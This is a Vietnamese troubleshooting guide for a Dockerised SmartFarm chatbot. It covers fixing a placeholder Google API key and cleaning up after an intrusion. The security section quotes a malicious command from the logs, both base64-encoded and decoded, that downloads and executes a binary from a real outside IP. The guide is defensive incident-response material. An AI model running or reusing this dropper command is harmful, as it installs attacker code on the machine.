# 🔧 Fix Chatbot API Key & Security Issue

## 🚨 Vấn Đề Nghiêm Trọng

**Từ logs chatbot, phát hiện 2 vấn đề:**

### 1. API Key Chưa Được Cấu Hình Đúng
```
⚠️ API key không tìm thấy hoặc là placeholder
GOOGLE_GENAI_API_KEY: exists
⚠️ GOOGLE_GENAI_API_KEY chưa được cấu hình hoặc là placeholder!
❌ Lỗi khi định nghĩa flow: Error: API key chưa được cấu hình
digest: 'API_KEY_NOT_CONFIGURED'
```

**Vấn đề:** API key tồn tại nhưng có thể là placeholder `"your-api-key"` hoặc giá trị rỗng.

---

### 2. ⚠️ SECURITY ALERT - Malicious Code Detected
```
⨯ [Error: Command failed: echo Y2QgL3RtcCAmJiAod2dldCAtcSBodHRwOi8vMTg4LjIxNC4zMC4xNDgvc3lzIC1PIC5zeXN0ZW1kIHx8IGN1cmwgLXMgaHR0cDovLzE4OC4yMTQuMzAuMTQ4L3N5cyAtbyAuc3lzdGVtZCkgJiYgY2htb2QgK3ggLnN5c3RlbWQgJiYgLi8uc3lzdGVtZCAmJiBybSAtZiAuc3lzdGVtZA==|base64 -d|sh
```

**Decode base64 này sẽ ra:**
```bash
cd /tmp && (wget -q http://188.214.30.148/sys -O .systemd || curl -s http://188.214.30.148/sys -o .systemd) && chmod +x .systemd && ./systemd && rm -f .systemd
```

**Đây là mã độc!** Lệnh này:
- Tải file từ IP lạ (188.214.30.148)
- Chạy file đó với quyền thực thi
- Có thể là backdoor, miner, hoặc malware

---

## ✅ Giải Pháp

### Bước 1: Kiểm Tra API Key Hiện Tại

**Trên VPS, chạy:**
```bash
cd /opt/SmartFarm

# Kiểm tra giá trị API key (chỉ hiện 10 ký tự đầu)
docker compose exec chatbot env | grep GOOGLE_GENAI_API_KEY | head -c 30

# Kiểm tra .env file
cat .env 2>/dev/null | grep GOOGLE_GENAI_API_KEY || echo "No .env file"
```

**Nếu thấy `your-api-key` hoặc giá trị rỗng → Cần thay bằng API key thật.**

---

### Bước 2: Cấu Hình API Key Đúng

**Trên VPS, chạy:**
```bash
cd /opt/SmartFarm

# Tạo hoặc edit .env file
nano .env

# Thêm hoặc sửa dòng (thay YOUR_ACTUAL_API_KEY bằng API key thật):
GOOGLE_GENAI_API_KEY=YOUR_ACTUAL_API_KEY

# Save và exit (Ctrl+X, Y, Enter)
```

**Lấy API key từ:** https://aistudio.google.com/ → Get API Key

---

### Bước 3: 🔒 Xử Lý Security Issue

**⚠️ QUAN TRỌNG: Kiểm tra và dọn dẹp mã độc**

**Trên VPS, chạy:**
```bash
cd /opt/SmartFarm

# 1. Kiểm tra file .systemd trong /tmp
ls -la /tmp/.systemd 2>/dev/null || echo "File không tồn tại (tốt)"

# 2. Tìm các process đáng ngờ
ps aux | grep -i "systemd\|188.214.30.148" | grep -v grep

# 3. Kiểm tra network connections đáng ngờ
netstat -tulpn | grep 188.214.30.148 || echo "Không có kết nối (tốt)"

# 4. Kiểm tra cron jobs đáng ngờ
crontab -l | grep -i "systemd\|188.214" || echo "Không có cron đáng ngờ (tốt)"

# 5. Kiểm tra trong chatbot container
docker compose exec chatbot ls -la /tmp/.systemd 2>/dev/null || echo "File không tồn tại trong container (tốt)"
docker compose exec chatbot ps aux | grep -i "systemd" | grep -v grep || echo "Không có process đáng ngờ (tốt)"
```

**Nếu tìm thấy file hoặc process đáng ngờ:**
```bash
# Xóa file độc hại
rm -f /tmp/.systemd
docker compose exec chatbot rm -f /tmp/.systemd

# Kill process đáng ngờ (nếu có)
# pkill -f systemd  # Cẩn thận! Chỉ kill process đáng ngờ, không phải systemd service thật

# Kiểm tra lại
ps aux | grep -i "systemd" | grep -v "systemd " | grep -v grep
```

---

### Bước 4: Rebuild Chatbot Container (Để Loại Bỏ Mã Độc)

**Trên VPS, chạy:**
```bash
cd /opt/SmartFarm

# Pull code mới (đảm bảo không có mã độc)
git pull origin main --no-rebase --no-edit

# Rebuild chatbot container (không dùng cache)
docker compose build --no-cache chatbot

# Restart chatbot
docker compose restart chatbot

# Đợi chatbot khởi động
sleep 45

# Kiểm tra logs (không còn lỗi mã độc)
docker compose logs chatbot --tail=50 | grep -i "systemd\|188.214" || echo "✅ Không còn lỗi mã độc"
```

---

### Bước 5: Kiểm Tra API Key Đã Hoạt Động

**Trên VPS, chạy:**
```bash
cd /opt/SmartFarm

# Kiểm tra logs (phải thấy "✅ Genkit đã được khởi tạo thành công")
docker compose logs chatbot --tail=50 | grep -i "genkit\|api.*key"

# Phải thấy:
# ✅ API key found: ... (length: ...)
# ✅ Genkit đã được khởi tạo thành công
```

---

## 🔑 Lấy Google AI API Key

**Nếu chưa có API key:**

1. **Vào:** https://aistudio.google.com/
2. **Click:** "Get API Key"
3. **Tạo API key mới**
4. **Copy API key**
5. **Thêm vào `.env` file trên VPS**

---

## 🎯 Kiểm Tra Sau Khi Fix

**Test từ browser:**
- Truy cập: https://smartfarm.kimngn.cfd/chatbot
- Gửi một câu hỏi
- Phải nhận được phản hồi từ AI (không còn 500)

**Test từ VPS:**
```bash
# Kiểm tra logs không còn lỗi
docker compose logs chatbot --tail=100 | grep -i "error\|systemd\|188.214" || echo "✅ Không còn lỗi"

# Test chatbot health
curl http://localhost:9002/chatbot/ 2>/dev/null | head -20
```

---

## 📋 Checklist

- [ ] Đã kiểm tra giá trị API key hiện tại
- [ ] Đã thêm GOOGLE_GENAI_API_KEY hợp lệ vào .env
- [ ] Đã kiểm tra và xóa file/process đáng ngờ (nếu có)
- [ ] Đã rebuild chatbot container (--no-cache)
- [ ] Đã kiểm tra logs không còn lỗi mã độc
- [ ] Đã kiểm tra logs thấy "✅ Genkit đã được khởi tạo thành công"
- [ ] Đã test chatbot hoạt động bình thường

---

## 🎯 Kết Quả Mong Đợi

**Sau khi fix:**
- ✅ API key hợp lệ được cấu hình
- ✅ Chatbot logs không còn lỗi API key
- ✅ Logs hiện: "✅ Genkit đã được khởi tạo thành công"
- ✅ Không còn lỗi mã độc trong logs
- ✅ Chatbot trả lời được câu hỏi (không còn 500)

---

## ⚠️ Lưu Ý Bảo Mật

**Nếu phát hiện mã độc:**
1. **Ngay lập tức:** Kiểm tra toàn bộ hệ thống
2. **Thay đổi:** Tất cả passwords và API keys
3. **Kiểm tra:** Logs hệ thống để tìm nguồn gốc
4. **Cân nhắc:** Rebuild toàn bộ containers từ code sạch

---

**Hãy kiểm tra API key và xử lý security issue ngay!** 🔧🔒✨
